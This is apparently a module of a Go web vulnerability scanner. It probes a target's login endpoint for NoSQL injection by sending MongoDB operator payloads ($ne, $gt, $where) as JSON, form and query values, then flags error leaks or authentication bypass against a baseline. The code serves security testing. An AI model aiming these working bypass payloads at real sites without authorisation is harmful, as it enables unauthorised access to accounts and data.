package core

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// NosqlInjectionTestingResult holds the result of the NosqlInjectionTesting module execution.
type NosqlInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// NosqlInjectionTesting executes the nosql_injection_testing security technique.
type NosqlInjectionTesting struct {
	BaseModule
	Target  string
	results []NosqlInjectionTestingResult
	// probeFailures counts transport/read failures; guarded by Mu.
	probeFailures int
}

// NewNosqlInjectionTesting creates a new instance.
func NewNosqlInjectionTesting(target string) *NosqlInjectionTesting {
	return &NosqlInjectionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(10 * time.Second),
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *NosqlInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

// noSQLPayloadCase describes one NoSQL operator payload and how it must be embedded.
type noSQLPayloadCase struct {
	Operator string // e.g. "$ne"
	Value    string
	TopLevel bool // $where is only honored as a top-level query key
}

// noSQLVariant identifies the encoding used to deliver an operator payload.
type noSQLVariant int

const (
	noSQLVariantJSON noSQLVariant = iota
	noSQLVariantForm
	noSQLVariantQuery
)

var noSqlPayloads = []noSQLPayloadCase{
	{Operator: "$gt", Value: ""},
	{Operator: "$ne", Value: "123"},
	{Operator: "$where", Value: "1==1", TopLevel: true},
}

// mongoErrorMarkers are specific MongoDB failure signatures. The bare product name
// ("mongodb") is deliberately excluded: it appears in branding, driver stack traces
// and health endpoints without any injection having occurred.
var mongoErrorMarkers = []string{
	"mongoerror",
	"cast to objectid failed",
	"syntax error, unexpected",
	"topology was destroyed",
}

// noSQLBaseline is a tri-state baseline: an error means neither the marker-absence
// check nor the bypass differential can run, so the scan must not fake a verdict.
type noSQLBaseline struct {
	fetched    bool
	status     int
	body       string
	authBypass bool // baseline already returns a session token for invalid credentials
}

func (m *NosqlInjectionTesting) getBaseline(ctx context.Context) (noSQLBaseline, error) {
	body := map[string]interface{}{
		"username": "invalid_user_12345",
		"password": "invalid_password_12345",
	}
	bodyBytes, _ := json.Marshal(body)

	req, err := http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
	if err != nil {
		return noSQLBaseline{}, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := m.Client.Do(req)
	if err != nil {
		return noSQLBaseline{}, err
	}
	defer resp.Body.Close()

	respBody, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		return noSQLBaseline{}, err
	}
	respStr := strings.ToLower(string(respBody))

	hasToken := strings.Contains(respStr, "\"token\":") || strings.Contains(respStr, "\"access_token\":")
	return noSQLBaseline{
		fetched:    true,
		status:     resp.StatusCode,
		body:       string(respBody),
		authBypass: resp.StatusCode >= 200 && resp.StatusCode < 300 && hasToken,
	}, nil
}

func (m *NosqlInjectionTesting) Execute(ctx context.Context) ([]NosqlInjectionTestingResult, error) {
	m.Mu.Lock()
	m.results = make([]NosqlInjectionTestingResult, 0)
	m.probeFailures = 0
	m.Mu.Unlock()

	baseline, err := m.getBaseline(ctx)
	if err != nil {
		// Without a baseline neither judging path is sound; report inconclusive
		// instead of a clean-looking empty result.
		m.addResult(statusFromEvidence(EvidenceWeak, false),
			formatEvidenceDetail(EvidenceWeak, "Baseline authentication probe failed: "+err.Error()),
			nil, "")
		return m.results, nil
	}

	type noSQLJob struct {
		payload noSQLPayloadCase
		variant noSQLVariant
	}

	jobs := make(chan noSQLJob, len(noSqlPayloads)*3)
	for _, p := range noSqlPayloads {
		for _, variant := range []noSQLVariant{noSQLVariantJSON, noSQLVariantForm, noSQLVariantQuery} {
			jobs <- noSQLJob{payload: p, variant: variant}
		}
	}
	close(jobs)

	var wg sync.WaitGroup

	for range m.MaxThreads {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, job.payload, job.variant, baseline)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}

	// Never render an all-failed probe set as a clean result.
	m.Mu.Lock()
	empty := len(m.results) == 0
	failures := m.probeFailures
	m.Mu.Unlock()
	if empty && failures > 0 {
		m.addResult(statusFromEvidence(EvidenceWeak, false),
			formatEvidenceDetail(EvidenceWeak, fmt.Sprintf("All %d NoSQL injection probes failed with transport/read errors", failures)),
			nil, "")
	}
	return m.results, nil
}

// noSQLFormValues renders an operator payload as bracket-notation form/query values,
// the encoding frameworks merge into Mongo query selectors server-side.
func noSQLFormValues(p noSQLPayloadCase) url.Values {
	values := url.Values{}
	if p.TopLevel {
		values.Set("["+p.Operator+"]", p.Value)
		return values
	}
	values.Set("username["+p.Operator+"]", p.Value)
	values.Set("password["+p.Operator+"]", p.Value)
	return values
}

func (m *NosqlInjectionTesting) testPayload(ctx context.Context, p noSQLPayloadCase, variant noSQLVariant, baseline noSQLBaseline) {
	var (
		req *http.Request
		err error
	)

	switch variant {
	case noSQLVariantJSON:
		var body map[string]interface{}
		if p.TopLevel {
			// $where must be sent as a top-level key; nesting it under
			// username/password is malformed and only produces guaranteed errors.
			body = map[string]interface{}{p.Operator: p.Value}
		} else {
			operator := map[string]interface{}{p.Operator: p.Value}
			body = map[string]interface{}{"username": operator, "password": operator}
		}
		bodyBytes, marshalErr := json.Marshal(body)
		if marshalErr != nil {
			m.recordProbeFailure()
			return
		}
		req, err = http.NewRequestWithContext(ctx, "POST", m.Target, bytes.NewBuffer(bodyBytes))
		if err == nil {
			req.Header.Set("Content-Type", "application/json")
		}
	case noSQLVariantForm:
		form := noSQLFormValues(p)
		req, err = http.NewRequestWithContext(ctx, "POST", m.Target, strings.NewReader(form.Encode()))
		if err == nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case noSQLVariantQuery:
		target, parseErr := url.Parse(m.Target)
		if parseErr != nil {
			m.recordProbeFailure()
			return
		}
		q := target.Query()
		for key, vals := range noSQLFormValues(p) {
			for _, v := range vals {
				q.Add(key, v)
			}
		}
		target.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", target.String(), nil)
	}
	if err != nil {
		m.recordProbeFailure()
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		m.recordProbeFailure()
		return
	}
	defer resp.Body.Close()

	respBody, err := ReadBoundedBody(resp.Body, MaxResponseBodyBytes)
	if err != nil {
		m.recordProbeFailure()
		return
	}
	body := string(respBody)
	bodyLower := strings.ToLower(body)

	payloadBytes, _ := json.Marshal(map[string]string{"operator": p.Operator, "value": p.Value, "variant": variantString(variant)})
	payloadStr := string(payloadBytes)

	// Error-leak evidence: a MongoDB failure signature the baseline does not already
	// contain. An error proves the operator was evaluated but is not, by itself, a
	// successful injection, so it is reported as inconclusive.
	baseLower := strings.ToLower(baseline.body)
	for _, marker := range mongoErrorMarkers {
		if strings.Contains(bodyLower, marker) && !strings.Contains(baseLower, marker) {
			detail := formatEvidenceDetail(EvidenceStrong, "MongoDB error leak observed with payload "+payloadStr+" (operator evaluated by the backend)")
			m.addResult(statusFromEvidence(EvidenceStrong, false), detail, req, payloadStr)
			return
		}
	}

	// Auth-bypass evidence: the probe is accepted (2xx/3xx) with a session signal
	// while the invalid-credential baseline was rejected. Any incidental cookie
	// (analytics, consent, theme) is not a session signal, so Set-Cookie only
	// counts when the cookie name is session-like.
	hasToken := strings.Contains(bodyLower, "\"token\":") || strings.Contains(bodyLower, "\"access_token\":")
	hasSessionCookie := false
	for _, sc := range resp.Header.Values("Set-Cookie") {
		if noSQLSessionCookieName(sc) {
			hasSessionCookie = true
			break
		}
	}
	isBypassCandidate := resp.StatusCode >= 200 && resp.StatusCode < 400 && (hasToken || hasSessionCookie)
	if !isBypassCandidate || !baseline.fetched || baseline.authBypass {
		return
	}

	// True condition = probe response, false condition = baseline (rejected credentials).
	tier := EvaluateDifferentialEvidence(body, baseline.body, baseline.body, true)
	if tier == EvidenceWeak && baseline.status >= 400 && normalizedCompactLower(baseline.body) == "" {
		// Rejected baseline with an empty body: the status differential (rejected
		// baseline vs accepted probe) is still meaningful evidence.
		tier = EvidenceStrong
	}
	switch tier {
	case EvidenceConfirmed, EvidenceStrong:
		detail := formatEvidenceDetail(tier, "NoSQL authentication bypass: probe accepted with a session signal while the invalid-credential baseline was rejected")
		m.addResult(statusFromEvidence(tier, false), detail, req, payloadStr)
	}
}

func variantString(v noSQLVariant) string {
	switch v {
	case noSQLVariantJSON:
		return "json"
	case noSQLVariantForm:
		return "form"
	case noSQLVariantQuery:
		return "query"
	}
	return "unknown"
}

// noSQLSessionCookieName reports whether a Set-Cookie header carries a
// session-like cookie name (case-insensitive match on the name portion).
// Cookies such as theme=dark or consent=1 are not evidence of an
// authenticated session.
func noSQLSessionCookieName(setCookie string) bool {
	name := setCookie
	if i := strings.IndexByte(name, '='); i >= 0 {
		name = name[:i]
	}
	name = strings.ToLower(strings.TrimSpace(name))
	return containsAnyToken(name, []string{"session", "auth", "token", "sid", "jwt"})
}

// recordProbeFailure counts a transport/read failure so an all-failed scan can be
// reported as inconclusive instead of a silently empty (clean-looking) result.
func (m *NosqlInjectionTesting) recordProbeFailure() {
	m.Mu.Lock()
	m.probeFailures++
	m.Mu.Unlock()
}

func (m *NosqlInjectionTesting) addResult(status, detail string, req *http.Request, payloadStr string) {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if req != nil {
		m.RecordPoC(req, nil, detail)
	}
	m.results = append(m.results, NosqlInjectionTestingResult{
		Target: m.Target,
		Status: status,
		Detail: detail,
	})
}

func init() {
	RegisterModule("nosql_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting NosqlInjectionTesting on: %s", target))

		tester := NewNosqlInjectionTesting(target)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
